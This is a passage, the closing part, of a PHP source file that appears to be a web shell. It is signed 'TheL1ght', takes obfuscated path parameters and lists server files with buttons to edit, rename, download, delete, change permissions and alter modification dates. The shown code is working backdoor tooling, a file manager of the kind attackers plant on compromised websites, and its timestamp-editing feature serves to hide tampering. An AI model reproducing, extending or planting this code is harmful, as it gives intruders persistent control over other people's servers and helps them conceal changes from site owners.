							foreach ($scup as $item) {
								if (is_file($item)) {
						?>

						<tr>
							<td>
								<i class="bi bi-file-text text-primary"></i> <a href="?cup=<?= tea($cup) ?>&item=<?= tea($item) ?>&tea=ef" <?php echo $_SERVER["SCRIPT_FILENAME"] == "$cup/$item" ? 'class="text-danger"' : "";?>><?= np($item);?></a>
							</td>
							<td><?= (function_exists('mime_content_type') ? mime_content_type($item) : filetype($item)) ?></td>
							<td><?= sall($item) ?></td>
							<td>
								<a style="cursor: pointer;" class="p-btn" data-item="<?= $item ?>" data-file-content="<?= substr(sprintf('%o', fileperms($item)), -4); ?>">
								<?php echo is_writable($cup . '/' . $item) ? '<font color="#14A44D">' : (!is_readable($cup . '/' . $item) ? '<font color="#DC4C64">' : ''); echo pall($cup . '/' . $item); echo '</font>';if(is_writable($cup . '/' . $item) || !is_readable($cup . '/' . $item)) ?>

								</a>
							</td>
							<td>
								<a style="cursor: pointer;" class="date-btn" data-item="<?= $item ?>" data-file-content="<?= date("Y-m-d h:i:s", filemtime($item)); ?>"><?= date("Y-m-d h:i:s", filemtime($item)); ?></a>
							</td>
							<td>
								<?php
									if ($item != '.' && $item != '..') {
								?>

								<div class="btn-group">
									<a href="?cup=<?= tea($cup) ?>&item=<?= tea($item) ?>&tea=ef" class="btn btn-outline-dark btn-sm mr-1"><i class="bi bi-file-earmark-code"></i></a>
									<button type="button" class="btn btn-outline-dark btn-sm mr-1 r-btn" data-item="<?= $item ?>"><i class="bi bi-pencil-square"></i></button>
									<a href="?cup=<?= tea($cup) ?>&item=<?= tea($item) ?>&tea=df" class="btn btn-outline-dark btn-sm mr-1"><i class="bi bi-download"></i></a>
									<button type="button" class="btn btn-outline-dark btn-sm mr-1 d-btn" data-item="<?= $item ?>"><i class="bi bi-trash"></i></button>
								</div>
								<?php
									}
								?>

							</td>
						</tr>
						<?php
								}
							}
						?>

					</tbody>
				</table>
			</div>
			<center>
				<?php
					if (count($scup) === 2) {
						echo 'Directory is empty.';
					}
				?>
				<hr width='20%'>
				<span>~ TheL1ght - <?= $_SERVER['HTTP_HOST']; ?></span>
			</center>
		</div>
		<script src="//code.jquery.com/jquery-3.7.0.js"></script>
		<script src="//cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
		<script type="text/javascript">
			
			<?php if (isset($_GET['tea']) && isset($_GET['item']) && $_GET['tea'] === 'ef') : ?>
				$(document).ready(function() { $("#em").modal("show"); });
			<?php endif; ?>

			<?php if (isset($_SESSION['message'])) : ?>
				get('<?= $_SESSION['message'] ?>', '<?= $_SESSION['color'] ?>')
			<?php endif; clear(); ?>

			function salin() {
				var textarea = document.getElementById('content');
				textarea.select();
				document.execCommand('copy');
				textarea.setSelectionRange(0, 0);
				get('Successfuly to copy text!', '#14A44D');
			}

			function get(pesan, warna) {
				var notifikasi = document.createElement('div');
				notifikasi.textContent = pesan;
				notifikasi.style.position = 'fixed';
				notifikasi.style.bottom = '20px';
				notifikasi.style.left = '20px';
				notifikasi.style.padding = '10px';
				notifikasi.style.borderRadius = '4px';
				notifikasi.style.zIndex = '1';
				notifikasi.style.opacity = '0';
				notifikasi.style.color = '#fff';
				notifikasi.style.backgroundColor = warna;

				document.body.appendChild(notifikasi);

				var opacity = 0;
				var fadeInInterval = setInterval(function() {
					opacity += 0.1;
					notifikasi.style.opacity = opacity.toString();
					if (opacity >= 1) {
						clearInterval(fadeInInterval);
						setTimeout(function() {
							var fadeOutInterval = setInterval(function() {
								opacity -= 0.1;
								notifikasi.style.opacity = opacity.toString();
								if (opacity <= 0) {
									clearInterval(fadeOutInterval);
									document.body.removeChild(notifikasi);
								}
							}, 30);
						}, 3000);
					}
				}, 30);
			}

			$(document).ready(function() {
				$('.date-btn').click(function() {
					var itemName = $(this).data('item');
					var fileContent = $(this).data('file-content');
					$('input[name="nd"]').val(fileContent);
					$('#dinn').text(itemName);
					$('#dipp').val(itemName);
					$('#mdtw').modal('show');
				})

				$('.p-btn').click(function() {
					var itemName = $(this).data('item');
					var fileContent = $(this).data('file-content');
					$('input[name="np"]').val(fileContent);
					$('#pin').text(itemName);
					$('#pip').val(itemName);
					$('#mp').modal('show');
				})

				$('.r-btn').click(function() {
					var itemName = $(this).data('item');
					$('input[name="nn"]').val(itemName);
					$('#rin').text(itemName);
					$('#rinn').val(itemName);
					$('#mr').modal('show');
				});

				$('.d-btn').click(function() {
					var itemName = $(this).data('item');
					$('#din').text(itemName);
					$('#dip').val(itemName);
					$('#md').modal('show');
				});
			});

			document.getElementById('ups').addEventListener('change', function() {
				var label = document.getElementById('uputama');
				if (this.files && this.files.length > 0) {
					if (this.files.length === 1) {
						var z = this.files[0].name;
						if (z.length > 11) {
							z = z.substring(0, 8) + '...';
						}
						label.textContent = z;
					} else {
						label.textContent = this.files.length + ' file';
					}
				} else {
					label.textContent = 'Select';
				}
			});
		</script>
	</body>
</html>
